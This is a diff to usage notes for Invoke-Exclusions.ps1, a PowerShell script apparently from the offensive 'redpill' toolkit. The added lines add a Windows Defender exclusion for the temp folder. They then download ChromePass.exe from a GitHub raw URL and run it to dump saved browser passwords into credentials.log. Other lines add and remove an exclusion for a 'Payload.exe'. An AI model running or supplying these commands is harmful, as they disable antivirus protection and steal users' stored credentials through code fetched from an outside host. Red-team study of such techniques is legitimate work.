@@ -48,12 +48,13 @@ Get-help .\Invoke-Exclusions.ps1 -Force
 .\Invoke-Exclusions.ps1 -action "add" -type "ExclusionProcess" -Exclude "$Env:TMP\Payload.exe"
 
 
-## Add exclusion + download URI PE + execute PE
-#Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
+## Add exclusion Path + Download URI PE + Execute PE
+# 1º - Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
+# 2º - Iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -OutFile "$Env:TMP\ChromePass.exe"
+# 3º - cd $Env:TMP; .\ChromePass.exe /stext credentials.log
 .\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionPath" -Exclude "$Env:TMP" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -Arguments "/stext credentials.log"
 
 
 #Remove-MpPreference -ExclusionProcess "$Env:TMP\Payload.exe" Force
 .\Invoke-Exclusions.ps1 -action "del" -type "ExclusionProcess" -Exclude "$Env:TMP\Payload.exe"
-
 ```
